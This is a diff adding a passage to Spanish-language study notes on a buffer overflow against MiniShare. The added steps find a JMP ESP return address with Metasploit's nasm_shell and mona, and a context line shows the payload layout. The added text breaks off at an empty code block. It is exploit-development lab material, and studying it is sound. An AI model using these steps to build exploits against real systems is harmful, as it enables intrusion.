@@ -127,3 +127,34 @@ payload = before_eip + eip + nops + shellcode
 
 ## Fase Encontrar Instruccion de Salto (JMP ESP)
 
+lo que tenemos que hacer es cargar una direccion en la variable eip. pero que esa direccion sea una instruccion de salto. como es una direccion y estando en una arquitectura de x86 debemos aplicar [[BOF - Little Endian]]
+
+primero debemos saber como es la direccion de instruccion de salto,  eso lo podemos hacer averiguendolo de la sig manera
+
+```shell
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+```
+y escribimos 
+`nasm > jmp ESP`
+
+nos da -> `FFE4`
+
+
+ahora si abrimos 
+```python
+!mona modules
+```
+obtenemos una sola libreria o modulo que cumple con todo en false
+
+![[Pasted image 20260107114439.png]]
+
+se trata del binario `minishare.exe`, luego en ese mismo debemos buscar la sig instruccion asi encontraremos la direccion donde esta esa bendita instruccion de salto hacia la pila
+
+```python
+!mona find -s "\xFF\xE4" -m minishare.exe
+```
+
+si no la encuentra puedes probar con 
+
+```pyht
+```
